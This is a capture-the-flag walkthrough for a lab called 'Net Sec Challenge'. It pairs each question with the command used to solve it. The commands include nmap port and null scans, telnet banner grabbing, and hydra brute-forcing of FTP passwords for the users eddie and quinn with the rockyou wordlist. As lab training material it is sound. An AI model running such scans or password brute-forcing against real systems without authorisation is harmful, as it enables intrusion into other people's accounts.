# Net Sec Challenge

## Questions and Commands

1. **What is the highest port number being open less than 10,000?**

   ```bash
   nmap -sT TARGET_IP
   ```

2. **There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

   ```bash
   nmap TARGET_IPs -p10000-20000
   ```

3. **How many TCP ports are open?**

   ```bash
   nmap -p- TARGET_IP -T4
   ```

4. **What is the flag hidden in the HTTP server header?**

   ```bash
   telnet TARGET_IP 80
   ```

5. **What is the flag hidden in the SSH server header?**

   ```bash
   telnet TARGET_IP 22
   ```

6. **We have an FTP server listening on a nonstandard port. What is the version of the FTP server?**

   ```bash
   telnet TARGET_IP 10021
   ```

7. **What is the flag hidden in one of these two account files accessible via FTP?**

   ```bash
   hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -s 10021
   hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -s 10021
   ftp TARGET_IP 10021
   ```

8. **Browsing to `http://TARGET_IP:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?**

   ```bash
   nmap -sN TARGET_IP
   ```